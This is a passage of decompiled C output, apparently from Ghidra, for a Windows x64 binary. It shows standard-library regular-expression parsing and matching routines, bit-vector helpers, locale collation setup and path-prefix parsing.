    cVar2 = FUN_1400081e4(param_1);
    if (cVar2 == '\0') {
      lVar4 = FUN_140008684((longlong)ppcVar1);
      FUN_140009d8c((longlong)ppcVar1,lVar4);
    }
    FUN_140009ccc((longlong)ppcVar1,lVar3,(longlong)puVar5);
  }
  return;
}



void FUN_140009438(longlong param_1,byte param_2)

{
  undefined8 *puVar1;
  
  puVar1 = FUN_14000856c(param_1 + 0x40,param_2);
  FUN_140009380((char **)param_1);
  FUN_140009d8c(param_1 + 0x40,(longlong)puVar1);
  *(undefined8 **)(param_1 + 0x48) = puVar1;
  return;
}



void FUN_14000947c(longlong param_1)

{
  longlong lVar1;
  int iVar2;
  ulonglong uVar3;
  
  iVar2 = *(int *)(param_1 + 0x18) + 1;
  *(int *)(param_1 + 0x18) = iVar2;
  lVar1 = FUN_140008628(param_1 + 0x40,iVar2);
  FUN_140009380((char **)param_1);
  FUN_140009d8c(param_1 + 0x40,lVar1);
  FUN_14000ca9c((uint **)(param_1 + 0x20),(uint *)(ulonglong)(*(int *)(param_1 + 0x18) + 1),'\0');
  uVar3 = (ulonglong)(*(uint *)(lVar1 + 0x20) >> 5);
  *(uint *)(*(longlong *)(param_1 + 0x20) + uVar3 * 4) =
       *(uint *)(*(longlong *)(param_1 + 0x20) + uVar3 * 4) | 1 << (*(uint *)(lVar1 + 0x20) & 0x1f);
  return;
}



bool FUN_1400094f4(byte **param_1,longlong param_2)

{
  byte *pbVar1;
  longlong lVar2;
  byte bVar3;
  byte bVar4;
  byte *pbVar5;
  ulonglong uVar6;
  byte *pbVar7;
  bool bVar8;
  
  bVar3 = **param_1;
  if ((*(uint *)(param_1 + 0x17) & 0x100) != 0) {
    bVar3 = std::ctype<char>::tolower(*(ctype_char_ **)(param_1[0x1a] + 8),bVar3);
  }
  pbVar1 = *param_1;
  pbVar7 = pbVar1 + 1;
  if ((*(uint **)(param_2 + 0x20) == (uint *)0x0) ||
     (pbVar5 = (byte *)FUN_1400030c8((char *)pbVar1,(char *)param_1[0x14],*(uint **)(param_2 + 0x20)
                                    ), pbVar5 == pbVar1)) {
    lVar2 = *(longlong *)(param_2 + 0x38);
    pbVar5 = pbVar7;
    if (lVar2 != 0) {
      bVar4 = bVar3;
      if ((*(uint *)(param_1 + 0x17) & 0x800) != 0) {
        bVar4 = FUN_14000cf04((longlong **)param_1[0x1a],bVar3);
      }
      uVar6 = FUN_140003134((uint)bVar4,lVar2);
      if ((char)uVar6 != '\0') goto LAB_1400095c9;
    }
    bVar4 = 0;
    if ((*(longlong *)(param_2 + 0x28) == 0) ||
       (bVar4 = 0,
       (*(byte *)((ulonglong)(bVar3 >> 3) + *(longlong *)(param_2 + 0x28)) &
       (byte)(1 << (bVar3 & 7))) == 0)) goto LAB_1400095cb;
  }
LAB_1400095c9:
  pbVar7 = pbVar5;
  bVar4 = 1;
LAB_1400095cb:
  bVar8 = bVar4 != (*(byte *)(param_2 + 0xc) & 1);
  if (bVar8) {
    *param_1 = pbVar7;
  }
  return bVar8;
}



ulonglong FUN_1400095fc(char **param_1,int param_2,uint param_3,error_type param_4)

{
  char cVar1;
  code *pcVar2;
  ulonglong uVar3;
  int iVar4;
  
  *(undefined4 *)((longlong)param_1 + 0x74) = 0;
  uVar3 = (ulonglong)param_3;
  do {
    if (param_3 == 0) {
      return uVar3;
    }
    cVar1 = *(char *)(param_1 + 0xf);
    iVar4 = (int)cVar1;
    if (param_2 == 8) {
      if (7 < (byte)(cVar1 - 0x30U)) {
        return uVar3;
      }
LAB_140009655:
      iVar4 = iVar4 + -0x30;
    }
    else {
      if ((byte)(cVar1 - 0x30U) < 10) goto LAB_140009655;
      if (param_2 != 0x10) {
        return uVar3;
      }
      if ((byte)(cVar1 + 0x9fU) < 6) {
        iVar4 = iVar4 + -0x57;
      }
      else {
        if (5 < (byte)(cVar1 + 0xbfU)) {
          return uVar3;
        }
        iVar4 = iVar4 + -0x37;
      }
    }
    if (iVar4 == -1) {
      return uVar3;
    }
    if ((0x7fffffff - iVar4) / param_2 < *(int *)((longlong)param_1 + 0x74)) {
      FUN_140009e2c(param_1,param_4);
      pcVar2 = (code *)swi(3);
      uVar3 = (*pcVar2)();
      return uVar3;
    }
    *(int *)((longlong)param_1 + 0x74) = *(int *)((longlong)param_1 + 0x74) * param_2 + iVar4;
    FUN_14000ac88(param_1);
    param_3 = (int)uVar3 - 1;
    uVar3 = (ulonglong)param_3;
  } while( true );
}



void FUN_1400096ac(char **param_1,int param_2)

{
  int iVar1;
  char *pcVar2;
  code *pcVar3;
  ushort uVar4;
  uint uVar5;
  error_type eVar6;
  
  pcVar2 = *param_1;
  iVar1 = *(int *)((longlong)param_1 + 0x7c);
  eVar6 = -(uint)(param_2 != 0x2e) & 0xe;
  uVar5 = 0;
  if (param_2 == 0x3d) {
    eVar6 = 0;
  }
  if (param_2 == 0x3a) {
    eVar6 = 1;
  }
  while ((((iVar1 != 0x3a && (iVar1 != 0x3d)) && (iVar1 != 0x2e)) && (iVar1 != -1))) {
    FUN_14000ac88(param_1);
    uVar5 = uVar5 + 1;
    iVar1 = *(int *)((longlong)param_1 + 0x7c);
  }
  if (iVar1 != param_2) {
    FUN_140009e2c(param_1,eVar6);
    pcVar3 = (code *)swi(3);
    (*pcVar3)();
    return;
  }
  if (param_2 == 0x3a) {
    uVar4 = FUN_140004b10((longlong)param_1[0xd],pcVar2,*param_1,
                          (byte)((uint)*(undefined4 *)(param_1 + 0xe) >> 8) & 1);
    if (uVar4 == 0) {
      FUN_140009e2c(param_1,1);
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    FUN_140007cfc((longlong)(param_1 + 8),uVar4,'\0');
  }
  else if (param_2 == 0x3d) {
    if (pcVar2 == *param_1) {
LAB_1400097d7:
      FUN_140009e2c(param_1,0);
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    FUN_140007b64((longlong)(param_1 + 8),pcVar2,*param_1);
  }
  else if (param_2 == 0x2e) {
    if (pcVar2 == *param_1) goto LAB_1400097d7;
    FUN_140007a3c((longlong)(param_1 + 8),pcVar2,*param_1,uVar5);
  }
  FUN_14000ac88(param_1);
  FUN_140009e38(param_1,0x5d,eVar6);
  return;
}



undefined FUN_1400097fc(longlong param_1,char param_2)

{
  if (param_2 == 'f') {
    *(undefined4 *)(param_1 + 0x74) = 0xc;
  }
  else if (param_2 == 'n') {
    *(undefined4 *)(param_1 + 0x74) = 10;
  }
  else if (param_2 == 'r') {
    *(undefined4 *)(param_1 + 0x74) = 0xd;
  }
  else if (param_2 == 't') {
    *(undefined4 *)(param_1 + 0x74) = 9;
  }
  else {
    if (param_2 != 'v') {
      return 0;
    }
    *(undefined4 *)(param_1 + 0x74) = 0xb;
  }
  return 1;
}



ulonglong FUN_140009848(longlong param_1,char param_2)

{
  undefined4 uVar1;
  ulonglong in_RAX;
  
  if (param_2 == 'a') {
    uVar1 = 7;
  }
  else {
    if (param_2 != 'b') {
      return in_RAX & 0xffffffffffffff00;
    }
    uVar1 = 8;
  }
  *(undefined4 *)(param_1 + 0x74) = uVar1;
  return 1;
}



ulonglong FUN_140009868(longlong *param_1,longlong param_2)

{
  ulonglong uVar1;
  byte bVar2;
  longlong lVar3;
  longlong lVar4;
  longlong local_88 [8];
  undefined8 local_48 [8];
  
  FUN_140005274(local_88,param_1);
  bVar2 = 0;
  do {
    if (param_2 == 0) {
LAB_140009942:
      uVar1 = FUN_140005ed8((longlong)local_88);
      return uVar1 & 0xffffffffffffff00 | (ulonglong)bVar2;
    }
    FUN_14000658c(param_1,local_88);
    uVar1 = FUN_14000a6e4((byte **)param_1,*(longlong *)(param_2 + 0x10));
    if ((char)uVar1 != '\0') {
      if (*(char *)(param_1 + 0x19) == '\0') {
        bVar2 = 1;
      }
      else {
        FUN_140005274(local_48,param_1);
        lVar4 = *param_1 - local_88[0];
        while (param_2 = *(longlong *)(param_2 + 0x28), param_2 != 0) {
          FUN_14000658c(param_1,local_88);
          uVar1 = FUN_14000a6e4((byte **)param_1,*(longlong *)(param_2 + 0x10));
          if (((char)uVar1 != '\0') && (lVar3 = *param_1 - local_88[0], lVar4 < lVar3)) {
            FUN_14000658c(local_48,param_1);
            lVar4 = lVar3;
          }
        }
        FUN_14000658c(param_1,local_48);
        bVar2 = 1;
        FUN_140005ed8((longlong)local_48);
      }
      goto LAB_140009942;
    }
    param_2 = *(longlong *)(param_2 + 0x28);
  } while( true );
}



void FUN_14000996c(longlong param_1)

{
  longlong lVar1;
  
  lVar1 = FUN_140008684(param_1 + 0x40);
  FUN_140009380((char **)param_1);
  FUN_140009d8c(param_1 + 0x40,lVar1);
  return;
}



ulonglong FUN_1400099b0(longlong *param_1,longlong param_2,char param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  undefined8 *puVar4;
  int iVar5;
  byte bVar6;
  bool bVar7;
  longlong local_res8;
  undefined8 local_b8;
  void *local_b0;
  longlong local_a8;
  longlong local_98;
  undefined8 local_78 [8];
  
  uVar3 = 0;
  FUN_140005274(&local_b8,param_1);
  uVar2 = uVar3;
  if (0 < *(int *)(param_2 + 0x20)) {
    do {
      iVar5 = (int)uVar2;
      lVar1 = *param_1;
      uVar2 = FUN_14000a6e4((byte **)param_1,*(longlong *)(param_2 + 0x10));
      if ((char)uVar2 == '\0') {
        FUN_14000658c(param_1,&local_b8);
        goto LAB_140009b24;
      }
      if (lVar1 == *param_1) {
        iVar5 = *(int *)(param_2 + 0x20) + -1;
      }
      uVar2 = (ulonglong)(iVar5 + 1U);
    } while ((int)(iVar5 + 1U) < *(int *)(param_2 + 0x20));
  }
  FUN_140005274(local_78,param_1);
  bVar6 = 0;
  local_res8 = *param_1;
  uVar3 = FUN_14000a6e4((byte **)param_1,*(longlong *)(*(longlong *)(param_2 + 0x28) + 0x10));
  if ((char)uVar3 != '\0') {
    if (param_3 == '\0') {
LAB_140009afb:
      uVar3 = 1;
      goto LAB_140009b1a;
    }
    FUN_14000658c(local_78,param_1);
    bVar6 = 1;
  }
  do {
    if ((*(int *)(param_2 + 0x24) != -1) &&
       (iVar5 = (int)uVar2, uVar2 = (ulonglong)(iVar5 + 1), *(int *)(param_2 + 0x24) <= iVar5))
    break;
    *param_1 = local_res8;
    if ((void **)(param_1 + 1) != &local_b0) {
      FUN_140001aac((void **)(param_1 + 1),local_b0,local_a8 - (longlong)local_b0 >> 2);
      param_1[4] = local_98;
    }
    uVar3 = FUN_14000a6e4((byte **)param_1,*(longlong *)(param_2 + 0x10));
    if ((char)uVar3 == '\0') break;
    lVar1 = *param_1;
    uVar3 = FUN_14000a6e4((byte **)param_1,*(longlong *)(*(longlong *)(param_2 + 0x28) + 0x10));
    if ((char)uVar3 != '\0') {
      if (param_3 == '\0') goto LAB_140009afb;
      FUN_14000658c(local_78,param_1);
      bVar6 = 1;
    }
    bVar7 = local_res8 != lVar1;
    local_res8 = lVar1;
  } while (bVar7);
  puVar4 = local_78;
  if (bVar6 == 0) {
    puVar4 = &local_b8;
  }
  FUN_14000658c(param_1,puVar4);
  uVar3 = (ulonglong)bVar6;
LAB_140009b1a:
  FUN_140005ed8((longlong)local_78);
LAB_140009b24:
  uVar2 = FUN_140005ed8((longlong)&local_b8);
  return uVar2 & 0xffffffffffffff00 | uVar3;
}



ulonglong FUN_140009b4c(longlong *param_1,longlong param_2,char param_3,int param_4)

{
  int iVar1;
  longlong *plVar2;
  bool bVar3;
  byte bVar4;
  ulonglong uVar5;
  longlong lVar6;
  int *piVar7;
  longlong local_70;
  undefined8 local_68 [8];
  
  if (*(int *)(param_2 + 0x34) == 1) {
    uVar5 = FUN_1400099b0(param_1,param_2,param_3);
    return uVar5;
  }
  bVar4 = 0;
  FUN_140005274(local_68,param_1);
  piVar7 = (int *)((ulonglong)*(uint *)(param_2 + 0x30) * 0x10 + param_1[0x10]);
  iVar1 = *piVar7;
  plVar2 = *(longlong **)(piVar7 + 2);
  local_70 = *param_1;
  if ((param_4 == 0) || (*plVar2 != local_70)) {
    bVar3 = true;
  }
  else {
    bVar3 = false;
  }
  if ((*(int *)(param_2 + 0x24) < 0) ||
     (*(int *)(param_2 + 0x24) != param_4 && param_4 <= *(int *)(param_2 + 0x24))) {
    if (param_4 < *(int *)(param_2 + 0x20)) {
      if (!bVar3) goto LAB_140009c73;
LAB_140009be7:
      *piVar7 = param_4 + 1;
      *(longlong **)(piVar7 + 2) = &local_70;
      lVar6 = *(longlong *)(param_2 + 0x10);
      goto LAB_140009c7b;
    }
    if (param_3 != '\0') {
      if (bVar3) {
        *piVar7 = param_4 + 1;
        *(longlong **)(piVar7 + 2) = &local_70;
        uVar5 = FUN_14000a6e4((byte **)param_1,*(longlong *)(param_2 + 0x10));
        bVar4 = (byte)uVar5;
      }
      else if (1 < param_4) goto LAB_140009c8a;
      if (bVar4 != 0) goto LAB_140009c97;
      *piVar7 = iVar1;
      *(longlong **)(piVar7 + 2) = plVar2;
      FUN_14000658c(param_1,local_68);
      goto LAB_140009c73;
    }
    uVar5 = FUN_14000a6e4((byte **)param_1,*(longlong *)(*(longlong *)(param_2 + 0x28) + 0x10));
    bVar4 = (byte)uVar5;
    if (bVar4 != 0) goto LAB_140009c97;
    if (bVar3) {
      FUN_14000658c(param_1,local_68);
      goto LAB_140009be7;
    }
  }
  else {
LAB_140009c73:
    lVar6 = *(longlong *)(*(longlong *)(param_2 + 0x28) + 0x10);
LAB_140009c7b:
    uVar5 = FUN_14000a6e4((byte **)param_1,lVar6);
    bVar4 = (byte)uVar5;
    if (bVar4 != 0) goto LAB_140009c97;
  }
LAB_140009c8a:
  FUN_14000658c(param_1,local_68);
LAB_140009c97:
  *piVar7 = iVar1;
  *(longlong **)(piVar7 + 2) = plVar2;
  uVar5 = FUN_140005ed8((longlong)local_68);
  return uVar5 & 0xffffffffffffff00 | (ulonglong)bVar4;
}



void FUN_140009ccc(longlong param_1,longlong param_2,longlong param_3)

{
  longlong lVar1;
  longlong lVar2;
  longlong lVar3;
  undefined8 *puVar4;
  longlong lVar5;
  
  lVar5 = *(longlong *)(param_2 + 0x10);
  lVar1 = *(longlong *)(param_3 + 0x10);
  *(undefined8 *)(param_3 + 0x10) = 0;
  lVar2 = *(longlong *)(param_1 + 8);
  *(longlong *)(param_1 + 8) = param_3;
  *(undefined8 *)(param_3 + 0x10) = 0;
  *(longlong *)(lVar2 + 0x10) = param_3;
  lVar2 = *(longlong *)(lVar5 + 0x28);
  while (lVar3 = lVar2, lVar3 != 0) {
    lVar5 = lVar3;
    lVar2 = *(longlong *)(lVar3 + 0x28);
  }
  puVar4 = (undefined8 *)operator_new(0x30);
  if (puVar4 != (undefined8 *)0x0) {
    *(undefined4 *)((longlong)puVar4 + 0xc) = 0;
    puVar4[2] = 0;
    puVar4[3] = 0;
    puVar4[5] = 0;
    *puVar4 = std::_Node_if::vftable;
    *(undefined4 *)(puVar4 + 1) = 0x10;
    puVar4[4] = param_3;
  }
  *(undefined8 **)(lVar5 + 0x28) = puVar4;
  puVar4[2] = lVar1;
  *(undefined8 *)(lVar1 + 0x18) = *(undefined8 *)(lVar5 + 0x28);
  return;
}



void FUN_140009d8c(longlong param_1,longlong param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined4 uVar3;
  
  if (*(int *)(param_2 + 8) == 8) {
    uVar3 = 9;
  }
  else {
    uVar3 = 0xc;
    if (1 < *(int *)(param_2 + 8) - 10U) {
      uVar3 = 0xe;
    }
  }
  puVar1 = (undefined8 *)operator_new(0x28);
  puVar2 = (undefined8 *)0x0;
  if (puVar1 != (undefined8 *)0x0) {
    *(undefined4 *)((longlong)puVar1 + 0xc) = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    *puVar1 = std::_Node_end_group::vftable;
    *(undefined4 *)(puVar1 + 1) = uVar3;
    puVar1[4] = param_2;
    puVar2 = puVar1;
  }
  FUN_14000a578(param_1,(longlong)puVar2);
  return;
}



undefined8 FUN_140009e10(undefined8 *param_1)

{
  FUN_14000ac30((longlong)param_1,0x15);
  return *param_1;
}



void FUN_140009e2c(undefined8 param_1,error_type param_2)

{
  code *pcVar1;
  
  std::_Xregex_error(param_2);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_140009e38(char **param_1,int param_2,error_type param_3)

{
  code *pcVar1;
  
  if (*(int *)((longlong)param_1 + 0x7c) == param_2) {
    FUN_14000ac88(param_1);
    return;
  }
  FUN_140009e2c(param_1,param_3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



short * FUN_140009e54(short *param_1,short *param_2)

{
  short *psVar1;
  uint uVar2;
  longlong lVar3;
  
  lVar3 = (longlong)param_2 - (longlong)param_1 >> 1;
  if (1 < lVar3) {
    uVar2 = FUN_1400049a8(param_1);
    if ((uVar2 & 0xffffffdf) - 0x3a0041 < 0x1a) {
      param_1 = param_1 + 2;
    }
    else if ((*param_1 == 0x5c) || (*param_1 == 0x2f)) {
      if (lVar3 < 4) {
        if (lVar3 < 3) {
          return param_1;
        }
      }
      else {
        psVar1 = param_1 + 3;
        if (((*psVar1 == 0x5c) || (*psVar1 == 0x2f)) &&
           ((lVar3 == 4 || ((param_1[4] != 0x5c && (param_1[4] != 0x2f)))))) {
          if ((param_1[1] == 0x5c) || (param_1[1] == 0x2f)) {
            if (param_1[2] == 0x3f) {
              return psVar1;
            }
            if (param_1[2] == 0x2e) {
              return psVar1;
            }
          }
          if ((param_1[1] == 0x3f) && (param_1[2] == 0x3f)) {
            return psVar1;
          }
        }
      }
      if ((((param_1[1] == 0x5c) || (param_1[1] == 0x2f)) && (param_1[2] != 0x5c)) &&
         (param_1[2] != 0x2f)) {
        for (param_1 = param_1 + 3;
            ((param_1 != param_2 && (*param_1 != 0x5c)) && (*param_1 != 0x2f));
            param_1 = param_1 + 1) {
        }
      }
    }
  }
  return param_1;
}



undefined4 FUN_140009f4c(longlong param_1)

{
  return *(undefined4 *)(param_1 + 0x20);
}



undefined (*) [16] FUN_140009f50(longlong param_1,undefined (*param_2) [16])

{
  ulonglong uVar1;
  ulonglong uVar2;
  longlong lVar3;
  longlong lVar4;
  
  *param_2 = ZEXT816(0);
  *(undefined8 *)param_2[1] = 0;
  if ((((byte)*(undefined4 *)(param_1 + 0x70) & 0x22) == 2) ||
     (uVar1 = **(ulonglong **)(param_1 + 0x40), uVar1 == 0)) {
    if ((*(byte *)(param_1 + 0x70) & 4) != 0) {
      return param_2;
    }
    if (**(longlong **)(param_1 + 0x38) == 0) {
      return param_2;
    }
    lVar4 = **(longlong **)(param_1 + 0x18);
    lVar3 = (**(int **)(param_1 + 0x50) - lVar4) + **(longlong **)(param_1 + 0x38);
    *(longlong *)(*param_2 + 8) = lVar3;
    *(longlong *)param_2[1] = lVar3;
  }
  else {
    lVar4 = **(longlong **)(param_1 + 0x20);
    uVar2 = uVar1;
    if (uVar1 < *(ulonglong *)(param_1 + 0x68)) {
      uVar2 = *(ulonglong *)(param_1 + 0x68);
    }
    *(ulonglong *)(*param_2 + 8) = uVar2 - lVar4;
    *(ulonglong *)param_2[1] = (**(int **)(param_1 + 0x58) - lVar4) + uVar1;
  }
  *(longlong *)*param_2 = lVar4;
  return param_2;
}



undefined4 FUN_140009fd8(longlong param_1)

{
  return *(undefined4 *)(param_1 + 0xc4);
}



undefined4 FUN_140009fe0(longlong param_1)

{
  return *(undefined4 *)(param_1 + 0x24);
}



void FUN_140009fe4(longlong *param_1,longlong param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined8 *this;
  undefined8 *puVar4;
  _Locinfo *this_00;
  _Collvec *p_Var5;
  void *_Memory;
  undefined8 *puVar6;
  undefined auStack232 [32];
  undefined4 local_c8;
  undefined8 *local_c0;
  _Collvec local_b8;
  _Locinfo local_a8 [104];
  void *local_40;
  ulonglong local_28;
  ulonglong local_20;
  
  local_20 = DAT_140017038 ^ (ulonglong)auStack232;
  puVar4 = (undefined8 *)0x0;
  local_c8 = 0;
  if ((param_1 != (longlong *)0x0) && (*param_1 == 0)) {
    this = (undefined8 *)operator_new(0x20);
    puVar6 = puVar4;
    local_c0 = this;
    if (this != (undefined8 *)0x0) {
      puVar4 = (undefined8 *)FUN_14000c6f8(param_2,(undefined (*) [16])&local_40);
      local_c8 = 1;
      if (0xf < (ulonglong)puVar4[3]) {
        puVar4 = (undefined8 *)*puVar4;
      }
      this_00 = (_Locinfo *)std::_Locinfo::_Locinfo(local_a8,(char *)puVar4);
      local_c8 = 3;
      std::locale::facet::facet((facet *)this,0);
      *this = std::collate<char>::vftable;
      p_Var5 = std::_Locinfo::_Getcoll(this_00,&local_b8);
      uVar1 = *(undefined4 *)&p_Var5->field_0x4;
      uVar2 = *(undefined4 *)&p_Var5->_LocaleName;
      uVar3 = *(undefined4 *)((longlong)&p_Var5->_LocaleName + 4);
      *(uint *)(this + 2) = p_Var5->_Page;
      *(undefined4 *)((longlong)this + 0x14) = uVar1;
      *(undefined4 *)(this + 3) = uVar2;
      *(undefined4 *)((longlong)this + 0x1c) = uVar3;
      puVar4 = this;
      puVar6 = (undefined8 *)0x3;
    }
    *param_1 = (longlong)puVar4;
    if (((ulonglong)puVar6 & 2) != 0) {
      puVar6 = (undefined8 *)(ulonglong)((uint)puVar6 & 0xfffffffd);
      std::_Locinfo::__Locinfo(local_a8);
    }
    if ((((ulonglong)puVar6 & 1) != 0) && (0xf < local_28)) {
      _Memory = local_40;
      if ((0xfff < local_28 + 1) &&
         (_Memory = *(void **)((longlong)local_40 + -8),
         0x1f < (ulonglong)((longlong)local_40 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(_Memory);
    }
  }
  FUN_14000eed0(local_20 ^ (ulonglong)auStack232);
  return;
}



undefined8 FUN_14000a134(longlong param_1)

{
  return *(undefined8 *)(param_1 + 8);
}



void FUN_14000a13c(char **param_1,uint param_2)

{
  code *pcVar1;
  ulonglong uVar2;
  
  uVar2 = FUN_1400095fc(param_1,0x10,param_2,2);
  if ((int)uVar2 == 0) {
    return;
  }
  FUN_140009e2c(param_1,2);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



bool FUN_14000a170(char **param_1)

{
  byte bVar1;
  
  bVar1 = FUN_14000a42c((longlong)param_1);
  if (bVar1 != 0) {
    *(int *)((longlong)param_1 + 0x74) = (int)*(char *)(param_1 + 0xf);
    FUN_14000ac88(param_1);
  }
  return bVar1 != 0;
}



// WARNING: Could not reconcile some variable overlaps

longlong *
FUN_14000a1a0(void **param_1,longlong *param_2,uint **param_3,ulonglong param_4,char *param_5)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  longlong lVar3;
  uint uVar4;
  undefined8 local_28;
  uint *puStack32;
  undefined4 local_18;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  
  local_28 = *param_3;
  puStack32 = param_3[1];
  uVar2 = FUN_14000a2f4(param_1,&local_28,param_4);
  puVar1 = (ulonglong *)(param_2 + 1);
  local_28._0_4_ = SUB84(*param_1,0);
  local_28._4_4_ = (undefined4)((ulonglong)*param_1 >> 0x20);
  *(undefined4 *)param_2 = (undefined4)local_28;
  *(undefined4 *)((longlong)param_2 + 4) = local_28._4_4_;
  *(undefined4 *)(param_2 + 1) = 0;
  *(undefined4 *)((longlong)param_2 + 0xc) = 0;
  if (((longlong)uVar2 < 0) && (*puVar1 < -uVar2)) {
    uVar2 = uVar2 + *puVar1;
    lVar3 = (~uVar2 >> 5) * -4 + -4;
  }
  else {
    uVar2 = uVar2 + *puVar1;
    lVar3 = (uVar2 >> 5) << 2;
  }
  *param_2 = *param_2 + lVar3;
  *puVar1 = uVar2;
  *puVar1 = (ulonglong)((uint)uVar2 & 0x1f);
  uVar2 = param_2[1];
  if (((longlong)param_4 < 0) && (uVar2 < -param_4)) {
    lVar3 = (~(uVar2 + param_4) >> 5) * -4 + -4;
    uVar4 = (uint)(uVar2 + param_4);
  }
  else {
    uVar4 = (uint)(uVar2 + param_4);
    lVar3 = (uVar2 + param_4 >> 5) * 4;
  }
  puStack32 = (uint *)(ulonglong)(uVar4 & 0x1f);
  local_28 = (uint *)(*param_2 + lVar3);
  local_18 = *(undefined4 *)param_2;
  uStack20 = *(undefined4 *)((longlong)param_2 + 4);
  uStack16 = *(undefined4 *)(param_2 + 1);
  uStack12 = *(undefined4 *)((longlong)param_2 + 0xc);
  FUN_14000293c((uint **)&local_18,(uint **)&local_28,*param_5);
  return param_2;
}



void FUN_14000a2d8(longlong param_1,longlong param_2)

{
  *(longlong *)(*(longlong *)(param_1 + 0x18) + 0x10) = param_2;
  *(undefined8 *)(param_2 + 0x18) = *(undefined8 *)(param_1 + 0x18);
  *(longlong *)(param_1 + 0x18) = param_2;
  *(longlong *)(param_2 + 0x10) = param_1;
  return;
}



ulonglong FUN_14000a2f4(void **param_1,longlong *param_2,ulonglong param_3)

{
  longlong lVar1;
  code *pcVar2;
  longlong *plVar3;
  void *pvVar4;
  ulonglong uVar5;
  undefined4 local_res8 [2];
  uint *local_58;
  ulonglong uStack80;
  uint *local_48 [2];
  undefined4 local_38;
  undefined4 uStack52;
  undefined4 uStack48;
  undefined4 uStack44;
  longlong local_28 [2];
  undefined4 local_18 [4];
  
  uVar5 = (*param_2 - (longlong)*param_1 >> 2) * 0x20 + param_2[1];
  if (param_3 != 0) {
    if (0x7fffffffffffffffU - (longlong)param_1[3] < param_3) {
      FUN_14000ba4c();
      pcVar2 = (code *)swi(3);
      uVar5 = (*pcVar2)();
      return uVar5;
    }
    local_res8[0] = 0;
    FUN_1400043d4(param_1,param_3 + 0x1f + (longlong)param_1[3] >> 5,local_res8);
    pvVar4 = (void *)(param_3 + (longlong)param_1[3]);
    if (param_1[3] == (void *)0x0) {
      param_1[3] = pvVar4;
    }
    else {
      FUN_14000c12c(param_1,(longlong *)local_48);
      param_1[3] = pvVar4;
      plVar3 = FUN_14000c12c(param_1,local_28);
      if (((longlong)uVar5 < 0) && (uVar5 != 0)) {
        lVar1 = -((~uVar5 >> 5) * 4 + 4);
      }
      else {
        lVar1 = (uVar5 >> 5) * 4;
      }
      local_58 = (uint *)((longlong)*param_1 + lVar1);
      local_38 = *(undefined4 *)plVar3;
      uStack52 = *(undefined4 *)((longlong)plVar3 + 4);
      uStack48 = *(undefined4 *)(plVar3 + 1);
      uStack44 = *(undefined4 *)((longlong)plVar3 + 0xc);
      uStack80 = (ulonglong)((uint)uVar5 & 0x1f);
      FUN_140002710(local_18,&local_58,local_48,(uint **)&local_38);
    }
  }
  return uVar5;
}



byte FUN_14000a42c(longlong param_1)

{
  char cVar1;
  uint uVar2;
  byte bVar3;
  
  uVar2 = *(uint *)(param_1 + 0x80);
  cVar1 = *(char *)(param_1 + 0x78);
  if ((uVar2 >> 0x16 & 1) != 0) {
    if (((((cVar1 != 'D') && (cVar1 != 'S')) && (cVar1 != 'W')) &&
        ((cVar1 != 'c' && (cVar1 != 'd')))) && ((cVar1 != 's' && (cVar1 != 'w')))) {
      return 1;
    }
    return 0;
  }
  if (cVar1 < '0') {
    if ((cVar1 == '/') || (cVar1 == '\"')) {
      bVar3 = (byte)(uVar2 >> 0x18);
      goto LAB_14000a4be;
    }
    if (cVar1 == '$') {
      return 1;
    }
    if ((cVar1 != '(') && (cVar1 != ')')) {
      if (cVar1 == '*') {
        return 1;
      }
      if (cVar1 != '+') {
        if (cVar1 == '.') {
          return 1;
        }
        return 0;
      }
    }
  }
  else if (cVar1 != '?') {
    if (cVar1 == '[') {
      return 1;
    }
    if (cVar1 == '\\') {
      return 1;
    }
    if (cVar1 == '^') {
      return 1;
    }
    if (cVar1 != '{') {
      if (cVar1 == '|') {
        return 1;
      }
      if (cVar1 != '}') {
        return 0;
      }
    }
  }
  bVar3 = (byte)(uVar2 >> 0x17);
LAB_14000a4be:
  return bVar3 & 1;
}



undefined FUN_14000a4c8(longlong *param_1)

{
  undefined uVar1;
  char *pcVar2;
  
  uVar1 = 1;
  pcVar2 = (char *)(*param_1 + 1);
  if ((pcVar2 == (char *)param_1[2]) ||
     ((((*(uint *)(param_1 + 0x10) & 8) != 0 || (1 < (byte)(*pcVar2 - 0x28U))) &&
      (((*(uint *)(param_1 + 0x10) & 0x10) != 0 || ((*pcVar2 + 0x85U & 0xfd) != 0)))))) {
    uVar1 = 0;
  }
  return uVar1;
}



ulonglong FUN_14000a504(byte **param_1)

{
  uint uVar1;
  byte *pbVar2;
  ulonglong uVar3;
  byte bVar4;
  
  uVar1 = *(uint *)((longlong)param_1 + 0xbc);
  uVar3 = (ulonglong)uVar1;
  if (((uVar1 >> 8 & 1) == 0) && (pbVar2 = *param_1, pbVar2 == param_1[0x13])) {
    if (pbVar2 == param_1[0x14]) {
      return (ulonglong)(uVar1 & 0xffffff00 | (uint)((uVar1 & 0xc) == 0));
    }
    bVar4 = 0;
    if ((uVar1 & 4) != 0) goto LAB_14000a55b;
    bVar4 = *pbVar2;
  }
  else {
    pbVar2 = *param_1;
    if (pbVar2 != param_1[0x14]) {
      return (ulonglong)((&DAT_1400117f0)[pbVar2[-1]] != (&DAT_1400117f0)[*pbVar2]);
    }
    bVar4 = 0;
    if ((uVar1 & 8) != 0) goto LAB_14000a55b;
    bVar4 = pbVar2[-1];
  }
  uVar3 = (ulonglong)bVar4;
  bVar4 = 0;
  if ((&DAT_1400117f0)[uVar3] != '\0') {
    bVar4 = 1;
  }
LAB_14000a55b:
  return uVar3 & 0xffffffffffffff00 | (ulonglong)bVar4;
}



longlong FUN_14000a578(longlong param_1,longlong param_2)

{
  longlong lVar1;
  
  *(undefined8 *)(param_2 + 0x18) = *(undefined8 *)(param_1 + 8);
